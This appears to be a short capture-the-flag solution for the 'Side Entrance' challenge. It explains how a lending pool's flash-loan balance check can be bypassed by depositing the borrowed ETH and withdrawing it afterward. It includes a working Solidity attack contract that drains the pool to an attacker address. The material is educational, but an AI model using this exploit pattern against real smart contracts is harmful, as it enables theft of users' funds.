## Side Entrance solution

As always, we have to drain the pool. This time it has `deposit` and `withdraw` capabilities with a mapping of balances. On a `flashLoan` function there is a check wheter balances of ETH before and after external call are the same. This means we can execute a flashloan, deposit all ETH taken from the pool via `deposit` function during the flashLoan and withdraw it after the flashLoan, all in a single transaction.

```
    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }

    function execute() external payable override {
        pool.deposit{value: address(this).balance}();
    }
```